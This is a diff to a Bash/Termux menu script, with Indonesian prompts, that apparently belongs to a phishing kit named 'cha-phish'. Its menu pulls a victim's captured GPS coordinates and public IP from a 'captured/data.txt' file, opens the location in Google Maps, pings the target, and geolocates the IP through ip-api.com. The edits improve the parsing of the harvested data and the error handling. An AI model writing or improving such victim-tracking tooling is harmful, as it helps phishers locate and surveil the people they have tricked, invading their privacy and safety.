@@ -96,7 +96,7 @@ show_menu() {
         4)
             echo -e "${GREEN}▶ BUKA LOKASI TARGET DI MAPS${NC}"
             cd ~/cha-phish/"ai mamb"/captured
-            COORD=$(grep -oE 'GPS    : [0-9.-]+, [0-9.-]+' data.txt 2>/dev/null | tail -1 | sed 's/GPS    : //')
+            COORD=$(grep -v '127.0.0.1' data.txt 2>/dev/null | grep -oE 'GPS    : [0-9.-]+, [0-9.-]+' | tail -1 | sed 's/GPS    : //')
             if [ -n "$COORD" ]; then
                 echo -e "${YELLOW}📍 Buka maps: $COORD${NC}"
                 termux-open "https://maps.google.com/?q=$COORD"
@@ -109,7 +109,7 @@ show_menu() {
         5)
             echo -e "${GREEN}▶ CEK KONEKSI TARGET${NC}"
             cd ~/cha-phish/"ai mamb"/captured
-            IP=$(grep -oE 'IP     : [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' data.txt 2>/dev/null | tail -1 | awk '{print $3}')
+            IP=$(grep -oE 'IP PUBLIK : [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' data.txt 2>/dev/null | tail -1 | awk '{print $4}')
             if [ -n "$IP" ]; then
                 echo -e "${YELLOW}📍 Ping ke $IP ...${NC}"
                 ping -c 4 $IP
@@ -150,23 +150,25 @@ show_menu() {
             fi
             echo -e "${YELLOW}⏳ Melacak IP...${NC}"
             response=$(curl -s "http://ip-api.com/json/$target_ip?fields=status,message,country,regionName,city,lat,lon,isp,org,as,timezone,mobile,proxy,hosting")
-            status=$(echo "$response" | jq -r '.status')
+            status=$(echo "$response" | jq -r '.status' 2>/dev/null)
             if [ "$status" == "fail" ]; then
-                message=$(echo "$response" | jq -r '.message')
+                message=$(echo "$response" | jq -r '.message' 2>/dev/null)
                 echo -e "${RED}❌ Gagal: $message${NC}"
+            elif [ -z "$status" ]; then
+                echo -e "${RED}❌ Gagal: respon tidak valid${NC}"
             else
-                country=$(echo "$response" | jq -r '.country')
-                region=$(echo "$response" | jq -r '.regionName')
-                city=$(echo "$response" | jq -r '.city')
-                lat=$(echo "$response" | jq -r '.lat')
-                lon=$(echo "$response" | jq -r '.lon')
-                isp=$(echo "$response" | jq -r '.isp')
-                org=$(echo "$response" | jq -r '.org')
-                asn=$(echo "$response" | jq -r '.as')
-                tz=$(echo "$response" | jq -r '.timezone')
-                mobile=$(echo "$response" | jq -r '.mobile')
-                proxy=$(echo "$response" | jq -r '.proxy')
-                hosting=$(echo "$response" | jq -r '.hosting')
+                country=$(echo "$response" | jq -r '.country' 2>/dev/null)
+                region=$(echo "$response" | jq -r '.regionName' 2>/dev/null)
+                city=$(echo "$response" | jq -r '.city' 2>/dev/null)
+                lat=$(echo "$response" | jq -r '.lat' 2>/dev/null)
+                lon=$(echo "$response" | jq -r '.lon' 2>/dev/null)
+                isp=$(echo "$response" | jq -r '.isp' 2>/dev/null)
+                org=$(echo "$response" | jq -r '.org' 2>/dev/null)
+                asn=$(echo "$response" | jq -r '.as' 2>/dev/null)
+                tz=$(echo "$response" | jq -r '.timezone' 2>/dev/null)
+                mobile=$(echo "$response" | jq -r '.mobile' 2>/dev/null)
+                proxy=$(echo "$response" | jq -r '.proxy' 2>/dev/null)
+                hosting=$(echo "$response" | jq -r '.hosting' 2>/dev/null)
                 echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
                 echo -e "${YELLOW}📍 INFO IP TARGET${NC}"
                 echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
